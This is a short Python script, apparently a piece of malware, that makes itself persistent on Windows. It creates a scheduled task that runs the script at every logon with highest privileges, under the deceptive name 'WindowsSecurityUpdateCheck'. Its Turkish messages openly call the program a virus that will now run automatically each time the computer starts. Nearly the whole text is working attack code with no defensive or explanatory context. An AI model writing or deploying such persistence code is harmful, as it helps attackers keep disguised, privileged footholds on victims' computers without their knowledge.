import os
import sys
import subprocess

print("--- PERSISTENCE (SCHEDULED TASK) ---")

payload_path = os.path.abspath(sys.argv[0])
task_name = "WindowsSecurityUpdateCheck" 

def create_task():
    cmd = f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc onlogon /rl highest /f'
    result = subprocess.run(cmd, shell=True, capture_output=True)
    
    if result.returncode == 0:
        print(f"✅ Kalıcılık sağlandı! Görev: {task_name}")
        print("Bilgisayar her açıldığında bu virüs otomatik çalışacak.")
    else:
        print("❌ Hata: Yönetici olarak çalıştırmalısın.")

create_task()